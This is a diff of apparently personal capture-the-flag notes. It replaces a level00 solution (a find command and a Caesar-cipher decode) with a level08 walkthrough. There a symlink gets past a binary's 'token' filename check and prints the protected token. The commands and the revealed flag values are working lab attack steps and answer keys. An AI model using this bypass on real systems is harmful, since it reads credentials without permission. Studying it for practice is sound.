@@ -1,5 +1,29 @@
-find / -user flag00 2>/dev/null
+# We have two file, binary level08 and token, token on group flag08
+# We run ./level08
+./level08 [file to read]
 
-find all file owned by user flag00, redirect bad result in /dev/null
+# Token ?
+./level08 token
+> You may not access 'token'
 
-Code : cdiiddwpgswtgt, brutforce cesar code, it's 15 -> "nottoohardhere"
+# Search time, STRINGS COMMING
+
+# strings level08 ...?
+%s [file to read]
+token 🧐
+You may not access '%s'
+Unable to open %s
+Unable to read fd %d
+
+# ¿ TOKEN HARDCODED ?, why ...? 
+# Maybe if token in name?
+./level08 /tmp/tokentest
+> You may not access '/tmp/tokentest' 🤯
+
+# Symbolic link might work ?
+ln -s ~/token /tmp/paprika
+./level08 /tmp/paprika
+> quif5eloekouj29ke0vouxean
+
+# IT'S FLAG TIME 🥵
+
